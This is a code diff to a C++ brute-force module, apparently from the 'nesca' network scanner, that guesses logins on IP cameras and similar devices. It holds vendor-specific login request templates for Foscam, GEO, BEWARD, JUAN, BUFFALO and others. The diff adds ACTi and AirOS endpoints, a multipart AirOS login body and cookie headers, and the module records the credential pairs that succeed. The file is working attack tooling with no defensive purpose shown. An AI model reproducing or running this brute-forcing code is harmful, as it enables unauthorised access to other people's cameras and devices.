@@ -3,7 +3,7 @@
 #include "BruteUtils.h"
 #include "FileUpdater.h"
 
-lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
+lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *cookie)
 {
     lopaStr lps = {"UNKNOWN", "", ""};
     bool result = true;
@@ -83,6 +83,14 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("errno=\"4\"");
 	}
+	else if (strcmp(SPEC, "ACTi") == 0)
+	{
+		negVector.push_back("ERROR: ");
+	}
+	else if (strcmp(SPEC, "AirOS") == 0)
+	{
+		negVector.push_back("Invalid credentials");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -112,90 +120,129 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 			request[0] = 0;
             if(strcmp(SPEC, "IPC") == 0)
             {
-                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
-                        ip, port, login, login, pass, pass);
+                sprintf(request, "%s/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
+                        ip, login, login, pass, pass);
             }
             else if(strcmp(SPEC, "GEO") == 0)
             {
-                sprintf(request, "%s:%d/Login.cgi?username=%s&password=%s",
-                        ip, port, login, pass);
+                sprintf(request, "%s/Login.cgi?username=%s&password=%s",
+                        ip, login, pass);
             }
             else if(strcmp(SPEC, "EasyCam") == 0)
             {
-                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
-                        ip, port, login, login, pass, pass);
+                sprintf(request, "%s/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
+                        ip, login, login, pass, pass);
             }
             else if(strcmp(SPEC, "Foscam") == 0)
             {
-                sprintf(request, "%s:%d/cgi-bin/CGIProxy.fcgi?usr=%s&pwd=%s&cmd=logIn&usrName=%s&pwd=%s",
-                        ip, port, login, pass, login, pass);
+                sprintf(request, "%s/cgi-bin/CGIProxy.fcgi?usr=%s&pwd=%s&cmd=logIn&usrName=%s&pwd=%s",
+                        ip, login, pass, login, pass);
             }
             else if(strcmp(SPEC, "AVIOSYS") == 0)
             {
-                sprintf(request, "%s:%d/check_user.html?UserName=%s&PassWord=%s",
-                        ip, port, login, pass);
+                sprintf(request, "%s/check_user.html?UserName=%s&PassWord=%s",
+                        ip, login, pass);
             }
             else if(strcmp(SPEC, "IPCAM") == 0)
             {
-                sprintf(request, "%s:%d/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s&-time=1416767330831",
-                        ip, port, login, pass);
+                sprintf(request, "%s/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s&-time=1416767330831",
+                        ip, login, pass);
             }
             else if(strcmp(SPEC, "IEORFOREFOX") == 0)
             {
                 doPost = true;
-                sprintf(request, "%s:%d/logincheck.rsp?type=1", ip, port);
+                sprintf(request, "%s/logincheck.rsp?type=1", ip);
                 sprintf(postData, "username=%s&userpwd=%s", login, pass);
             }
             else if(strcmp(SPEC, "BUFFALO") == 0)
             {
                 doPost = true;
-                sprintf(request, "%s:%d/rpc/login", ip, port);
+                sprintf(request, "%s/rpc/login", ip);
                 sprintf(postData, "user=%s&password=%s", login, pass);
 			}
 			else if (strcmp(SPEC, "DVS") == 0)
 			{
 				doPost = true;
-				sprintf(request, "%s:%d/login", ip, port);
+				sprintf(request, "%s/login", ip);
 				sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
 			}
 			else if (strcmp(SPEC, "MASPRO") == 0)
 			{
 				doPost = true;
-				sprintf(request, "%s:%d/setup_login.cgi", ip, port);
+				sprintf(request, "%s/setup_login.cgi", ip);
 				sprintf(postData, "check_username=%s&check_password=%s&login=", login, pass);
 			}
 			else if (strcmp(SPEC, "WEBCAMXP") == 0)
 			{
 				doPost = true;
-				sprintf(request, "%s:%d/login.html", ip, port);
+				sprintf(request, "%s/login.html", ip);
 				sprintf(postData, "username=%s&password=%s&Redir=/", login, pass);
 			}
 			else if (strcmp(SPEC, "JASSUN") == 0)
 			{
 				doPost = true;
-				sprintf(request, "%s:%d/Login.htm", ip, port);
+				sprintf(request, "%s/Login.htm", ip);
 				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
 			}
 			else if (strcmp(SPEC, "BEWARD") == 0)
 			{
-				sprintf(request, "%s:%d/webs/httplogin?username=%s&password=%s&UserID=45637757",
-					ip, port, login, pass);
+				sprintf(request, "%s/webs/httplogin?username=%s&password=%s&UserID=45637757",
+					ip, login, pass);
 			}
 			else if (strcmp(SPEC, "JUAN") == 0)
 			{
 				//sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=<juan ver=\"\" squ=\"\" dir=\"\"><envload type=\"0\" usr=\"%s\" pwd=\"%s\"/></juan>&_=1450923182693",
-				sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
-					ip, port, login, pass);
+				sprintf(request, "%s/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
+					ip, login, pass);
 			}
-			
-            std::string buffer;
-			Connector con;
-			if (doPost) res = con.nConnect(request, port, &buffer, postData);
-			else res = con.nConnect(request, port, &buffer);
+			else if (strcmp(SPEC, "ACTi") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s/cgi-bin/videoconfiguration.cgi", ip);
+				sprintf(postData, "LOGIN_ACCOUNT=%s&LOGIN_PASSWORD=%s", login, pass);
+			}
+			else if (strcmp(SPEC, "AirOS") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s/login.cgi", ip);
+				char tempPostData[1024] = { 0 };
+				int cl = 341 + strlen(login) + strlen(pass);
+				sprintf(tempPostData, "-----------------------------170381307613422\r\n\
+Content-Disposition: form-data; name=\"uri\"\r\n\
+\r\n\
+/\r\n\
+-----------------------------170381307613422\r\n\
+Content-Disposition: form-data; name=\"username\"\r\n\
+\r\n\
+%s\r\n\
+-----------------------------170381307613422\r\n\
+Content-Disposition: form-data; name=\"password\"\r\n\
+\r\n\
+%s\r\n\
+-----------------------------170381307613422--\
+\r\n", login, pass);
+
+				sprintf(postData, "Content-Type: multipart/form-data; boundary=---------------------------170381307613422\r\n\
+Content-Length: %d\r\n\r\n\
+%s", cl, tempPostData);
+			}
+
+			std::string buffer;
+			if (cookie->size() > 0) {
+				std::vector<std::string> cookieHeader{ *cookie };
+				Connector con;
+				if (doPost) res = con.nConnect(request, port, &buffer, postData, &cookieHeader);
+				else res = con.nConnect(request, port, &buffer, NULL, &cookieHeader);
+			}
+			else {
+				Connector con;
+				if (doPost) res = con.nConnect(request, port, &buffer, postData);
+				else res = con.nConnect(request, port, &buffer);
+			}
 
 			if (res == -2) {
 				if (rowIndex == -1) {
-					nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
+					nesca_3::addBARow(QString(ip), "--", "FAIL");
 				}
 				else {
 					stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
@@ -218,7 +265,7 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 					strcpy(lps.pass, passLst[j]);
 
 					if (rowIndex == -1) {
-						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), QString(login) + ":" + QString(pass), "OK");
+						nesca_3::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK");
 					}
 					else {
 						stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass), "OK");
@@ -227,10 +274,13 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 					return lps;
 				};
 			}
+			else {
+				return lps;
+			}
 			
 			if (BALogSwitched) {
 				if (rowIndex == -1) {
-					rowIndex = nesca_3::addBARow(QString(ip) + ":" + QString::number(port),
+					rowIndex = nesca_3::addBARow(QString(ip),
 						QString(login) + ":" + QString(pass),
 						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
 				}
@@ -245,7 +295,7 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
         };
     };
 	if (rowIndex == -1) {
-		nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
+		nesca_3::addBARow(QString(ip), "--", "FAIL");
 	}
 	else {
 		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
@@ -253,14 +303,14 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
     return lps;
 }
 
-lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC) {
+lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC, const std::string *cookie) {
     if(gMaxBrutingThreads > 0) {
         while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
 
 		++baCount;
 		++BrutingThrds;
 		stt->doEmitionUpdateArc(gTargets);
-		lopaStr lps = IPCBrute(ip, port, SPEC);
+		lopaStr lps = IPCBrute(ip, port, SPEC, cookie);
 		--BrutingThrds;
 
         return lps;
